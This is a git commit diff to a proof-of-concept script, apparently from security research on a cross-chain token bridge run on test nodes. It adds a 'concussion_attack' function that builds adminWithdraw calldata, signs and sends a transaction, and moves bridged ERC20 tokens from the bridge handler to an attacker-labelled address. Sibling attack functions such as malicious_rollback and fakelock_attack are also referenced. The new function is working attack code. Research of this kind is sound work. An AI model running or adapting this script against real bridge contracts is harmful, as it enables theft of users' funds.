7f50fe9cf4a7eeb1b046a97d383453b3dec3293c
NorwegianGoat <riccardomioli@gmail.com>
2022-03-17 15:34:48 +0000

    Renamed test file, added bridge abi

--- scripts/poc.py
+++ scripts/poc.py
@@ -1,6 +1,8 @@
 import logging
 from multiprocessing.connection import wait
 from typing import List
+import eth_utils
+import json
 from utils.ufw_mod import UFW, REJECT, ALLOW
 from utils.conntrack_mod import ConnTrack
 from model.node import Node
@@ -249,6 +251,48 @@ def malicious_rollback(mint: bool = False):
                acc.address, contracts['target'].address)
 
 
+def concussion_attack(mint: bool = False):
+    # This attack is a concussion attack if a user convinces the admin bridge
+    # to withdraw funds from the bridge for him. If the admin steals the funds
+    # for himself, then is a stealing of user funds
+    # https://github.com/ChainSafe/chainbridge-solidity/blob/master/contracts/Bridge.sol#L333
+    logging.info("Concussion attack test")
+    # We generate a transfer so we have at least one token in ERC20Safe
+    amount = n0.provider.toWei(1, 'ether')
+    redeem_tokens(n0.provider, acc,
+                  amount, ContractTypes.ERC20)
+    simple_token_transfer(1, ContractTypes.ERC20, n0, n1, mint)
+    contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
+    # Trudy address before the steal
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               TRUDY_ADDR, contracts['target'].address)
+    # Tokens bridged whose ownership is of the handler
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               contracts['handler'].address, contracts['target'].address)
+    # Load handler's abi, fire adminWithdraw
+    with open('crosscoin/build/contracts/Bridge.json') as f:
+        abi = json.loads(f.read())['abi']
+    contract = n0.provider.eth.contract(
+        address=contracts['handler'].address, abi=abi)
+    target = n0.provider.toBytes(
+        hexstr=contracts['target'].address).rjust(32, b'\0')
+    trudy = n0.provider.toBytes(hexstr=TRUDY_ADDR).rjust(32, b'\0')
+    amount = n0.provider.toBytes(primitive=amount).rjust(32, b'\0')
+    data = target + trudy + amount
+    # Fire transaction
+    t_dict = {"chainId": n0.chain_id,
+              "nonce": n0.eth.get_transaction_count(acc.address, 'pending'),
+              "gasPrice": n0.provider.toWei(10, "gwei"),
+              "gas": 1000000}
+    tx = contract.functions.adminWithdraw(contracts['handler'].address, data).buildTransaction(t_dict)
+    signed_tx = n0.provider.eth.account.sign_transaction(tx, acc.key)
+    tx_hash = n0.provider.eth.send_raw_transaction(
+        signed_tx.rawTransaction)
+    logging.info("adminWithdraw calldata: " + eth_utils.hexadecimal.encode_hex(data)+"\ntx hash: " + tx_hash.hex())
+    tx_recipit = n0.provider.eth.wait_for_transaction_receipt(tx_hash)
+    logging.debug(tx_recipit)
+    
+
 def tests():
     logging.info("Starting tests.")
     # deploy_bridge(ContractTypes.ERC20)
@@ -259,7 +303,8 @@ def tests():
     # transfer_crosscoin_stealer()
     # fakelock_attack()
     # TODO: Fakelock all'indietro non dovrebbe poter generare fondi perche` non sono stati sbloccati
-    malicious_rollback()
+    # malicious_rollback()
+    concussion_attack()
 
 
 if __name__ == "__main__":
